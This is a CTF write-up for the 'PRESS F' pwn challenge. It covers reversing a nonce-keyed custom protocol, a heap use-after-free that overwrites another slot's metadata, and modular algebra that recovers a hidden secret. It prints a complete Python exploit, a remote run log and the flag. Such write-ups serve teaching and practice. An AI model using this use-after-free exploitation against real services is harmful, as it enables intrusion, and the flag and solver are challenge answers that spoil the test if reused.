---
title: "PRESS F - Pwn Challenge Writeup"
date: "2026-06-27"
category: "Pwn"
status: "Read writeup"
href: "/blog/press-f"
image: "/images/press-f.svg"
imageAlt: "PRESS F pwn challenge"
excerpt: "Cyber Arena 2026 - Pwn - Heap use-after-free in an encrypted protocol, recover a hidden keeper secret, and unseal the flag."
---



**Category:** Pwn  
**Points:** 250  
**Author:** Cyrus  
**Flag format:** `MPTC{...}`  
**AI assistance:** Used to help organize notes, validate reasoning, and refine the final writeup.

## 1. Initial analysis

The archive contains a Dockerfile and a stripped static PIE binary named `pressf`.

The Dockerfile places the flag at `/home/ctf/flag.txt` and runs the service as an unprivileged `ctf` user. Locally, the binary exits if `flag.txt` is missing, so a test flag is needed before debugging:

```bash
echo 'MPTC{local_test_flag_123456789}' > flag.txt
./pressf
```

After printing a 201-byte banner, the service switches to a custom binary protocol.

## 2. Encrypted protocol

Each frame uses this structure:

```text
byte opcode
uint16_le payload_length
payload
```

The first server frame has opcode `0xa0` and contains a 16-byte nonce. That nonce initializes a custom 256-bit permutation used to:

1. Shuffle the opcode table.
2. Generate XOR streams for client-to-server payloads.

Server responses are plaintext. The exploit reimplements the permutation, opcode shuffle, and encryption in Python.

The useful logical commands are:

| Opcode | Meaning |
|---|---|
| `i` | Allocate a niche |
| `R` | Write an inscription |
| `V` | Read a niche |
| `E` | Free the inscription buffer |
| `F` | Invoke the hidden Keeper rite |
| `P` | Unseal the flag with a 32-byte secret |

## 3. Heap object layout

Each niche has a `0x38`-byte metadata object:

```c
struct niche {
    uint64_t keeper_type;  // +0x00
    char    *data;         // +0x08
    uint64_t capacity;     // +0x10
    uint64_t length;       // +0x18
    uint64_t field_20;     // +0x20
    uint64_t field_28;     // +0x28
};
```

Allocation is roughly:

```c
niche = malloc(0x38);
niche->data = calloc(size, 1);
```

There are 16 niche slots.

## 4. Vulnerability: use-after-free

The `E` command frees only the inscription buffer:

```c
free(niche->data);
freed[slot] = 1;
```

It does not clear `niche->data`, free the metadata object, or remove the slot pointer.

Most commands reject freed slots, but the `R` write command does not. That gives a write through a dangling pointer.

The useful overlap is simple:

```text
allocate slot 0 with size 0x38
free slot 0 data
allocate slot 1
```

Both the `0x38` data allocation and the `0x38` metadata allocation use glibc's `0x40` chunk size class. Slot 1 metadata reuses slot 0's freed data chunk:

```text
slot0->data == slot1 metadata
```

Writing through freed slot 0 lets us modify slot 1. Only the first qword is needed:

```python
write_slot(0, p64(1))
```

This sets:

```c
slot1->keeper_type = 1;
```

while keeping slot 1's valid data pointer and lengths intact.

## 5. Hidden Keeper recurrence

With `keeper_type == 1`, command `F` enters a hidden mathematical path.

The service stores four secret field elements `A, B, C, D` over modulus:

```text
q = 0x661844ea3ec26474099795bd97cc5e1c
    e1aed24fae5a17bd17c03a8455633ae3
```

For an inscription hash `h`, the Keeper returns:

```text
y_i = D_(i-1) + A*h_i mod q
```

and updates state:

```text
D_i = C + B*D_(i-1) mod q
```

Eliminating `D` gives a linear transition:

```text
C + B*y_i + A*h_(i+1) - U*h_i = y_(i+1)
```

where:

```text
U = A*B
```

Five chosen inscriptions give five outputs, producing four equations for `[C, B, A, U]`. Solving the `4 x 4` modular system recovers `A`, the 32-byte Keeper secret.

The exploit uses predictable inscriptions:

```python
bytes([0]) * 0x80
bytes([1]) * 0x80
bytes([2]) * 0x80
bytes([3]) * 0x80
bytes([4]) * 0x80
```

## 6. Flag unsealing

Command `P` accepts a 32-byte candidate secret.

Internally, the service derives:

```text
key = sponge_hash(secret || "FLAGSEAL")
```

and uses that stream to decrypt the in-memory flag ciphertext.

Submitting the recovered `A` returns the real flag.

## 7. Solver

Full solver code:

```python
#!/usr/bin/env python3

import argparse
import socket
import struct
import subprocess
from typing import BinaryIO

MASK = (1 << 64) - 1
ROUND_CONSTANTS = [
    0x9E37B1F4A3C0D52B,
    0x1C8E6F30B75A91D4,
    0x73D2A85C1E4F0B67,
    0xB409E7D1582C63AF,
    0x6F1A3E8D04B9C275,
    0x2D70C9A5F31E864B,
    0x85B3D61C0A7F249E,
    0xE1247AF08D3B5C96,
]
STATE_CONST_0 = 0xC3A5C85C97CB3127
STATE_CONST_1 = 0x452821E638D01377
MODULUS = int(
    "661844ea3ec26474099795bd97cc5e1c"
    "e1aed24fae5a17bd17c03a8455633ae3",
    16,
)
BANNER_SIZE = 201


def rol64(value: int, count: int) -> int:
    return ((value << count) | (value >> (64 - count))) & MASK


def ror64(value: int, count: int) -> int:
    return ((value >> count) | (value << (64 - count))) & MASK


def permutation(words: list[int]) -> list[int]:
    s = list(words)
    for round_no in range(20):
        s0, s1, s2, s3 = s
        x = (s0 + s1) & MASK
        s3 = rol64(s3 ^ x, 13)
        s2 = (s2 + s3) & MASK
        x = (x + s3) & MASK
        s1 = rol64(s1 ^ s2, 29)
        s2 = rol64(s2 ^ x, 7)
        s2 = (s2 + s1) & MASK
        s0 = ror64(x ^ s2, 23)
        s = [s0, s1, s2, s3]
        idx = round_no & 3
        s[idx] = (s[idx] + ROUND_CONSTANTS[round_no & 7] + round_no) & MASK
    return s


def sponge_hash(data: bytes) -> bytes:
    state = [
        0x6A09E667F3BCC908,
        0xBB67AE8584CAA73B,
        0x3C6EF372FE94F82B,
        0xA54FF53A5F1D36F1,
    ]
    full = len(data) // 32
    for block_no in range(full):
        block = struct.unpack_from("<4Q", data, block_no * 32)
        state = permutation([a ^ b for a, b in zip(state, block)])

    tail = bytearray(32)
    remainder = data[full * 32 :]
    tail[: len(remainder)] = remainder
    tail[len(remainder)] = 1
    block = struct.unpack("<4Q", tail)
    state = permutation([a ^ b for a, b in zip(state, block)])
    return struct.pack("<4Q", *state)


def initialize_protocol_state(nonce: bytes) -> list[int]:
    if len(nonce) != 16:
        raise ValueError("nonce must be exactly 16 bytes")
    n0, n1 = struct.unpack("<2Q", nonce)
    return permutation([n0, n1, STATE_CONST_0, STATE_CONST_1])


def protocol_prf(state: list[int], value: int) -> bytes:
    work = list(state)
    work[0] ^= value & 0xFFFFFFFF
    return struct.pack("<4Q", *permutation(work))


def build_opcode_permutation(state: list[int]) -> list[int]:
    table = list(range(256))
    stream = b""
    stream_pos = 32
    block_no = 0

    for i in range(255, -1, -1):
        if stream_pos == 32:
            stream = protocol_prf(state, 0x40000000 + block_no)
            stream_pos = 0
            block_no += 1
        j = stream[stream_pos] % (i + 1)
        stream_pos += 1
        table[i], table[j] = table[j], table[i]
    return table


def encrypt_request_payload(state: list[int], request_counter: int, payload: bytes) -> bytes:
    encrypted = bytearray(payload)
    base = (0x20000000 + request_counter * 0x4000) & 0xFFFFFFFF
    for offset in range(0, len(encrypted), 32):
        key_stream = protocol_prf(state, (base + offset // 32) & 0xFFFFFFFF)
        chunk_len = min(32, len(encrypted) - offset)
        for i in range(chunk_len):
            encrypted[offset + i] ^= key_stream[i]
    return bytes(encrypted)


class Tube:
    def read_exact(self, size: int) -> bytes:
        raise NotImplementedError

    def write(self, data: bytes) -> None:
        raise NotImplementedError

    def close(self) -> None:
        pass


class ProcessTube(Tube):
    def __init__(self, binary: str):
        self.process = subprocess.Popen(
            [binary],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0,
        )
        assert self.process.stdin is not None
        assert self.process.stdout is not None
        self.stdin: BinaryIO = self.process.stdin
        self.stdout: BinaryIO = self.process.stdout

    def read_exact(self, size: int) -> bytes:
        data = bytearray()
        while len(data) < size:
            chunk = self.stdout.read(size - len(data))
            if not chunk:
                stderr = b""
                if self.process.stderr is not None:
                    stderr = self.process.stderr.read()
                raise EOFError(
                    f"process closed while reading {size} bytes; "
                    f"received {len(data)}; stderr={stderr!r}"
                )
            data += chunk
        return bytes(data)

    def write(self, data: bytes) -> None:
        self.stdin.write(data)
        self.stdin.flush()

    def close(self) -> None:
        self.process.kill()


class SocketTube(Tube):
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port))

    def read_exact(self, size: int) -> bytes:
        data = bytearray()
        while len(data) < size:
            chunk = self.sock.recv(size - len(data))
            if not chunk:
                raise EOFError(f"socket closed while reading {size} bytes; received {len(data)}")
            data += chunk
        return bytes(data)

    def write(self, data: bytes) -> None:
        self.sock.sendall(data)

    def close(self) -> None:
        self.sock.close()


class PressFClient:
    def __init__(self, tube: Tube, verbose: bool = True):
        self.tube = tube
        self.verbose = verbose
        banner = tube.read_exact(BANNER_SIZE)
        if verbose:
            print(banner.decode(errors="replace"), end="")

        hello_type, nonce = self.receive_frame()
        if hello_type != 0xA0 or len(nonce) != 16:
            raise RuntimeError(f"unexpected greeting frame: type={hello_type:#x}, len={len(nonce)}")
        self.nonce = nonce
        self.state = initialize_protocol_state(nonce)
        self.opcode_table = build_opcode_permutation(self.state)
        self.request_counter = 0
        if verbose:
            print(f"[+] nonce: {nonce.hex()}")

    def receive_frame(self) -> tuple[int, bytes]:
        header = self.tube.read_exact(3)
        frame_type = header[0]
        length = struct.unpack("<H", header[1:])[0]
        return frame_type, self.tube.read_exact(length)

    def request(self, logical_opcode: str, payload: bytes = b"") -> tuple[int, bytes]:
        if len(logical_opcode) != 1:
            raise ValueError("opcode must be one character")
        wire_opcode = self.opcode_table[ord(logical_opcode)]
        encrypted = encrypt_request_payload(self.state, self.request_counter, payload)
        frame = bytes([wire_opcode]) + struct.pack("<H", len(encrypted)) + encrypted
        if self.verbose:
            print(
                f"[*] {logical_opcode!r}: wire={wire_opcode:#04x}, "
                f"counter={self.request_counter}, length={len(payload)}"
            )
        self.request_counter += 1
        self.tube.write(frame)
        response_type, response = self.receive_frame()
        if self.verbose:
            print(f"    response={response_type:#04x}, length={len(response)}")
        return response_type, response

    def allocate(self, slot: int, size: int) -> None:
        response_type, _ = self.request("i", struct.pack("<BH", slot, size))
        if response_type != 0x91:
            raise RuntimeError("allocation failed")

    def free(self, slot: int) -> None:
        response_type, _ = self.request("E", bytes([slot]))
        if response_type != 0x91:
            raise RuntimeError("free failed")

    def write_slot(self, slot: int, data: bytes) -> None:
        response_type, _ = self.request("R", bytes([slot]) + data)
        if response_type != 0x91:
            raise RuntimeError("write failed")

    def press_f(self, slot: int) -> bytes:
        response_type, response = self.request("F", bytes([slot]))
        if response_type != 0x93:
            raise RuntimeError("press-F operation failed")
        return response

    def unseal(self, secret: bytes) -> bytes:
        if len(secret) != 32:
            raise ValueError("secret must be 32 bytes")
        response_type, response = self.request("P", secret)
        if response_type != 0x93:
            raise RuntimeError("unseal operation failed")
        return response


def solve_linear_system_mod(matrix: list[list[int]], vector: list[int], modulus: int) -> list[int]:
    size = len(vector)
    aug = [
        [value % modulus for value in matrix[row]] + [vector[row] % modulus]
        for row in range(size)
    ]
    for column in range(size):
        pivot = next((row for row in range(column, size) if aug[row][column] % modulus), None)
        if pivot is None:
            raise RuntimeError("singular modular equation system")
        aug[column], aug[pivot] = aug[pivot], aug[column]
        inverse = pow(aug[column][column], -1, modulus)
        aug[column] = [(value * inverse) % modulus for value in aug[column]]
        for row in range(size):
            if row == column:
                continue
            factor = aug[row][column]
            if factor:
                aug[row] = [
                    (left - factor * right) % modulus
                    for left, right in zip(aug[row], aug[column])
                ]
    return [aug[row][-1] for row in range(size)]


def recover_keeper_secret(outputs: list[bytes], inscriptions: list[bytes]) -> bytes:
    if len(outputs) != 5 or len(inscriptions) != 5:
        raise ValueError("exactly five outputs and inscriptions are required")
    if any(len(item) != 32 for item in outputs):
        raise ValueError("special Press-F outputs must be 32 bytes")

    hs = [int.from_bytes(sponge_hash(item), "little") % MODULUS for item in inscriptions]
    ys = [int.from_bytes(item, "little") for item in outputs]

    # y_(i+1) = C + B*y_i + A*h_(i+1) - U*h_i, where U=A*B.
    # Four transitions solve for [C, B, A, U].
    matrix = []
    vector = []
    for i in range(4):
        matrix.append([1, ys[i], hs[i + 1], -hs[i]])
        vector.append(ys[i + 1])
    _c, _b, secret, _u = solve_linear_system_mod(matrix, vector, MODULUS)
    return secret.to_bytes(32, "little")


def exploit(client: PressFClient) -> bytes:
    client.allocate(0, 0x38)
    client.free(0)
    client.allocate(1, 0x80)

    # slot0->data now aliases slot1 metadata. Flip slot1->keeper_type to 1.
    client.write_slot(0, struct.pack("<Q", 1))

    inscriptions = [bytes([value]) * 0x80 for value in range(5)]
    outputs = []
    for inscription in inscriptions:
        client.write_slot(1, inscription)
        outputs.append(client.press_f(1))
    secret = recover_keeper_secret(outputs, inscriptions)
    print(f"[+] recovered 32-byte Keeper secret: {secret.hex()}")

    flag = client.unseal(secret)
    return flag.rstrip(b"\x00\r\n")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Exploit Press F")
    target = parser.add_mutually_exclusive_group()
    target.add_argument("--local", metavar="BINARY", help="run a local binary")
    target.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    parser.add_argument("--quiet", action="store_true")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.remote:
        host, port_text = args.remote
        tube: Tube = SocketTube(host, int(port_text))
    else:
        tube = ProcessTube(args.local or "./pressf")

    try:
        client = PressFClient(tube, verbose=not args.quiet)
        flag = exploit(client)
        print(f"[+] flag: {flag.decode(errors='replace')}")
        return 0
    finally:
        tube.close()


if __name__ == "__main__":
    raise SystemExit(main())
```

## 8. Exploit usage

Local usage needs a test `flag.txt` in the current working directory:

```bash
echo 'MPTC{local_test_flag_123456789}' > flag.txt
python3 solve_pressf.py --local ./pressf
```

Remote usage:

```bash
python3 solve_pressf.py --remote HOST PORT
```

Expected result:

```text
pc-2@DESKTOP-UJ23THH:/mnt/d/CNCC/Pwn/Press F$ python3 solve_pressf.py --remote 47.128.14.16 1342

  ===============================================
  =   PRESS  F  TO  PAY  RESPECTS               =
  =   Inter a niche. Press F. Move on.          =
  ===============================================
[+] nonce: ef6d63b5a55d9270ec2f7d05cf5fe613
[*] 'i': wire=0x05, counter=0, length=3
    response=0x91, length=0
[*] 'E': wire=0xe9, counter=1, length=1
    response=0x91, length=0
[*] 'i': wire=0x05, counter=2, length=3
    response=0x91, length=0
[*] 'R': wire=0x0d, counter=3, length=9
    response=0x91, length=0
[*] 'R': wire=0x0d, counter=4, length=129
    response=0x91, length=0
[*] 'F': wire=0x0c, counter=5, length=1
    response=0x93, length=32
[*] 'R': wire=0x0d, counter=6, length=129
    response=0x91, length=0
[*] 'F': wire=0x0c, counter=7, length=1
    response=0x93, length=32
[*] 'R': wire=0x0d, counter=8, length=129
    response=0x91, length=0
[*] 'F': wire=0x0c, counter=9, length=1
    response=0x93, length=32
[*] 'R': wire=0x0d, counter=10, length=129
    response=0x91, length=0
[*] 'F': wire=0x0c, counter=11, length=1
    response=0x93, length=32
[*] 'R': wire=0x0d, counter=12, length=129
    response=0x91, length=0
[*] 'F': wire=0x0c, counter=13, length=1
    response=0x93, length=32
[+] recovered 32-byte Keeper secret: 67d88b82da665c52bbf6418e9568c2bd70b0fe341c7a6283b83cb9b98b744e0f
[*] 'P': wire=0x69, counter=14, length=32
    response=0x93, length=45
[+] flag: MPTC{n0th1ng_3v3r_g03s_wr0ng_unt1l_1t_d035_F}
```

## 9. Exploit chain summary

```text
Decode nonce-based binary protocol
        ↓
Allocate slot 0 data with size 0x38
        ↓
Free slot 0 data, leaving dangling pointer
        ↓
Allocate slot 1; its metadata reuses the freed chunk
        ↓
Use unchecked R command on slot 0
        ↓
Set slot1->keeper_type = 1
        ↓
Collect five Keeper outputs for known hashes
        ↓
Solve modular equations and recover secret A
        ↓
Send A through command P
        ↓
Receive MPTC flag
```
